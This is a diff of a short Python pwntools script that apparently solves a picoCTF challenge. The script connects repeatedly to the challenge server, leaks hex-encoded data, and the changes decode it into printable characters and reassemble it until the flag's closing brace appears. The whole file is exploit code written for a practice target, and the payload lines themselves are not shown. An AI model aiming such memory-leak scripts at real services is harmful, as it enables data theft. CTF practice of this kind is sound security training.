@@ -1,7 +1,10 @@
 from pwn import *
 import codecs
 context.log_level = 'critical'
-for i in range(0, 100):
+output = ''
+for i in range(10, 100):
+    if('}' in output):
+        break
     conn = remote('mercury.picoctf.net', 6989)
     conn.recvuntil("portfolio")
     conn.sendline(b'1')
@@ -12,6 +15,12 @@ for i in range(0, 100):
     leaked = conn.recvline()
     leaked = str(leaked.decode('utf-8'))[:-1]
     try:
-        print(codecs.decode(leaked, 'hex'))
+        leaked_chrs = (codecs.decode(leaked, 'hex'))
+        temp = ''
+        for i in leaked_chrs:
+            if(32 < i < 126):
+                temp += chr(i)
+        output += temp[::-1]
+        print(output)
     except:
-        print('non printable')
+        print("cannot decode")
